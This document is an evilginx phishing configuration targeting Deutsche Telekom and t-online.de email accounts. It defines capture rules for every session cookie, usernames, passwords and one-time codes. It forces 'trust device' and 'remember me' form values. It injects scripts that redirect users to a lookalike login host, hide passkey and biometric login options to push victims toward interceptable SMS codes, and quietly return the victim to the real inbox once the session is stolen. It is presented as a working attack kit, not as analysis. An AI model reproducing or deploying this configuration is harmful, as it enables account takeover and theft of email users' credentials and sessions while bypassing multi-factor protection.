auth_tokens:
  - domain: "accounts.login.idm.telekom.com"
    keys: ['.*,regexp']

  - domain: ".accounts.login.idm.telekom.com"
    keys: ['.*,regexp']

  - domain: "account.idm.telekom.com"
    keys: ['.*,regexp']

  - domain: ".account.idm.telekom.com"
    keys: ['.*,regexp']

  - domain: ".idm.telekom.com"
    keys: ['.*,regexp']

  - domain: ".telekom.com"
    keys: ['.*,regexp']

  - domain: "email.t-online.de"
    keys: ['lisid', 'lisaMA', 'CNT', '.*,regexp']

  - domain: ".email.t-online.de"
    keys: ['lisid', 'lisaMA', 'CNT', '.*,regexp']

  - domain: "www.t-online.de"
    keys: ['.*,regexp']

  - domain: ".t-online.de"
    keys: ['.*,regexp']

  - domain: "www.telekom.de"
    keys: ['.*,regexp']

  - domain: ".telekom.de"
    keys: ['.*,regexp']

force_post:
  - path: "/factorx*"
    search:
      - {key: "pw_usr", search: ".*"}
    force:
      - {key: "persist_session", value: "on"}
      - {key: "persist_session_displayed", value: "1"}
    type: "post"
  - path: "/factorx*"
    search:
      - {key: "pw_pwd", search: ".*"}
    force:
      - {key: "persist_session", value: "on"}
      - {key: "remember_user", value: "on"}
      - {key: "persist_session_displayed", value: "1"}
    type: "post"
  - path: "/factorx/otp*"
    search:
      - {key: "otp", search: ".*"}
    force:
      - {key: "trust_device", value: "true"}
      - {key: "remember_device", value: "1"}
      - {key: "persist_session", value: "on"}
    type: "post"
  - path: "/factorx/tan*"
    search:
      - {key: "tan", search: ".*"}
    force:
      - {key: "trust_device", value: "true"}
      - {key: "remember_device", value: "1"}
      - {key: "persist_session", value: "on"}
    type: "post"
  - path: "/factorx/totp*"
    search:
      - {key: "totp", search: ".*"}
    force:
      - {key: "trust_device", value: "true"}
      - {key: "remember_device", value: "1"}
      - {key: "persist_session", value: "on"}
    type: "post"

auth_urls:
  - "/em*"
  - "/api/openid_connect_login*"
  - "/auth/login/oauth2/code/telekom*"
  - "/tech/sam/ess/callback*"
  - "/account-manager/auth-methods/setup/campaign/*"

credentials:
  username:
    key: "(^pw_usr$|^username$|^login$|^anmeldename$|^t-online-id$|^email$)"
    search: "(.*)"
    type: "post"
  password:
    key: "(^pw_pwd$|^password$|^passwd$|^passwort$|^pass$|^userPassword$)"
    search: "(.*)"
    type: "post"
  custom:
    - key: "hidden_usr"
      search: "(.*)"
      type: "post"
    - key: "username_json"
      search: '"username"\s*:\s*"([^"]*)'
      type: "json"
    - key: "password_json"
      search: '"password"\s*:\s*"([^"]*)'
      type: "json"
    - key: "(^otp$|^tan$|^code$|^token$|^one_time_password$|^passcode$|^verificationCode$|^mfa_code$|^otpCode$|^twoFactorCode$|^totp$|^sms_code$|^smsCode$)"
      search: "([0-9]+)"
      type: "post"
    - key: "otp_json"
      search: '"otp"\s*:\s*"([^"]*)'
      type: "json"
    - key: "tan_json"
      search: '"tan"\s*:\s*"([^"]*)'
      type: "json"
    - key: "code_json"
      search: '"code"\s*:\s*"([^"]*)'
      type: "json"

login:
  domain: "www.t-online.de"
  path: "/"

js_inject:
  - trigger_domains: ["www.t-online.de"]
    trigger_paths: ["/"]
    trigger_params: []
    script: |
      window.addEventListener('load', function() {
        var parts = window.location.hostname.split('.');
        parts[0] = 'tlogin';
        var tloginHost = parts.join('.');
        function uuid() {
          var a = '';
          for (var i = 0; i < 32; i++) a += Math.floor(Math.random() * 16).toString(16);
          return a.substr(0,8)+'-'+a.substr(8,4)+'-4'+a.substr(12,3)+'-'+(8+Math.floor(Math.random()*4)).toString(16)+a.substr(16,3)+'-'+a.substr(19,12);
        }
        var state = uuid();
        var loginUrl = 'https://' + tloginHost + '/oauth2/auth?response_type=code&state=' + state + '&redirect_uri=https%3A%2F%2Fwww.telekom.de%2Ftech%2Fsam%2Fess%2Fcallback&client_id=10LIVESAM30000004901VESPAPICOTELEKOM0000&display=page&scope=openid';
        var hash = window.location.hash;
        if (hash && hash.length > 1) { loginUrl += '&fragment=' + encodeURIComponent(hash.slice(1)); }
        window.location.href = loginUrl;
      });

  - trigger_domains: ["www.t-online.de"]
    trigger_paths: ["/auth/login/oauth2/code/telekom*"]
    trigger_params: []
    script: |
      window.addEventListener('load', function() {
        var parts = window.location.hostname.split('.');
        parts[0] = 'mail';
        var mailHost = parts.join('.');
        window.location.href = 'https://' + mailHost + '/em';
      });

  - trigger_domains: ["www.telekom.de"]
    trigger_paths: ["/tech/sam/ess/callback*"]
    trigger_params: []
    script: |
      window.addEventListener('load', function() {
        var parts = window.location.hostname.split('.');
        parts[0] = 'mail';
        var base = parts.slice(1).join('.');
        window.location.href = 'https://mail.' + base.replace('telekom.de', 't-online.de') + '/em';
      });

  - trigger_domains: ["account.idm.telekom.com"]
    trigger_paths: ["/account-manager/*"]
    trigger_params: []
    script: |
      (function() {
        function bypassCampaign() {
          // forwardURL loops back to the campaign state machine — skip it.
          // IDM long-lived cookies (AN*/NC*/AC*) are already set at this point,
          // so OIC silent re-auth on email.t-online.de will succeed independently.
          var parts = window.location.hostname.split('.');
          parts.shift();
          var base = parts.join('.');
          window.location.replace('https://mail.' + base + '/em');
        }
        if (document.readyState === 'loading') {
          document.addEventListener('DOMContentLoaded', bypassCampaign);
        } else {
          bypassCampaign();
        }
      })();

  - trigger_domains: ["accounts.login.idm.telekom.com"]
    trigger_paths: ["/*"]
    trigger_params: []
    script: |
      (function() {
        // Auto-check "Angemeldet bleiben" / stay-logged-in checkbox
        function checkPersist() {
          var selectors = [
            'input[name="persist_session"]',
            'input[id*="persist"]',
            'input[id*="remember"]',
            'input[id*="angemeldet"]',
            'input[id*="stay"]',
            'input[class*="persist"]',
            'input[class*="remember"]'
          ];
          selectors.forEach(function(sel) {
            document.querySelectorAll(sel).forEach(function(el) {
              if (el.type === 'checkbox' && !el.checked) {
                el.checked = true;
                el.dispatchEvent(new Event('change', {bubbles: true}));
                el.dispatchEvent(new Event('input', {bubbles: true}));
              }
            });
          });
        }
        checkPersist();
        var obs = new MutationObserver(checkPersist);
        if (document.body) { obs.observe(document.body, {childList: true, subtree: true}); }
        else { document.addEventListener('DOMContentLoaded', function() {
          checkPersist(); obs.observe(document.body, {childList: true, subtree: true});
        }); }
      })();

  - trigger_domains: ["accounts.login.idm.telekom.com"]
    trigger_paths: ["/*"]
    trigger_params: []
    script: |
      (function() {
        var hiddenSelectors = [
          '[class*="passkey"]', '[class*="webauthn"]', '[class*="biometric"]',
          '[class*="fido"]', '[data-method="passkey"]', '[data-testid*="passkey"]',
          '[data-testid*="webauthn"]', '[id*="passkey"]', '[id*="webauthn"]',
          'button[id*="passkey"]'
        ];
        var textKeywords = ['passkey', 'fingerabdruck', 'fingerprint', 'biometr',
          'windows hello', 'face id', 'touch id', 'fido'];
        function suppressPasskeys() {
          hiddenSelectors.forEach(function(sel) {
            document.querySelectorAll(sel).forEach(function(el) { el.style.display = 'none'; });
          });
          document.querySelectorAll('button, a, li, div[role="button"], div[role="option"]').forEach(function(el) {
            var txt = (el.textContent || '').toLowerCase();
            if (textKeywords.some(function(kw) { return txt.includes(kw); }) && txt.length < 80) {
              var container = el.closest('li, [class*="method"], [class*="option"], [class*="item"]') || el;
              container.style.display = 'none';
            }
          });
          var smsSelectors = ['[data-method="sms"]', '[data-testid*="sms"]',
            'button[id*="sms"]', 'li[class*="sms"]'];
          smsSelectors.forEach(function(sel) {
            var el = document.querySelector(sel);
            if (el && el.style.display !== 'none') el.click();
          });
        }
        suppressPasskeys();
        var obs = new MutationObserver(suppressPasskeys);
        if (document.body) { obs.observe(document.body, {childList: true, subtree: true}); }
        else { document.addEventListener('DOMContentLoaded', function() {
          suppressPasskeys(); obs.observe(document.body, {childList: true, subtree: true});
        }); }
      })();

  - trigger_domains: ["accounts.login.idm.telekom.com"]
    trigger_paths: ["/*"]
    trigger_params: []
    script: |
      window.addEventListener('load', function() {
        function waitForElm(selector) {
          return new Promise(function(resolve) {
            if (document.querySelector(selector)) return resolve(document.querySelector(selector));
            var observer = new MutationObserver(function() {
              if (document.querySelector(selector)) {
                resolve(document.querySelector(selector));
                observer.disconnect();
              }
            });
            observer.observe(document.body, {childList: true, subtree: true});
          });
        }
        var hash = window.location.hash.slice(1);
        if (hash.length === 0) return;
        var email = decodeURIComponent(hash);
        var selectors = [
          'input[name="username"]', 'input[name="login"]', 'input[name="t-online-id"]',
          'input[name="id"]', 'input[type="email"]', 'input[type="text"]'
        ];
        var found = false;
        for (var i = 0; i < selectors.length; i++) {
          var el = document.querySelector(selectors[i]);
          if (el) {
            el.value = email;
            el.dispatchEvent(new Event('input', {bubbles: true}));
            el.dispatchEvent(new Event('change', {bubbles: true}));
            found = true;
            break;
          }
        }
        if (!found) {
          waitForElm('input[type="email"], input[type="text"], input[name="username"]').then(function(el) {
            el.value = email;
            el.dispatchEvent(new Event('input', {bubbles: true}));
            el.dispatchEvent(new Event('change', {bubbles: true}));
          });
        }
      });

  - trigger_domains: ["email.t-online.de"]
    trigger_paths: ["/em*", "/api/openid_connect_login*"]
    trigger_params: []
    script: |
      (function() {
        // Give evilginx 1.5s to write the captured session, then send
        // the victim to the real domain so they see their actual inbox.
        setTimeout(function() {
          window.location.replace('https://email.t-online.de/em');
        }, 1500);
      })();
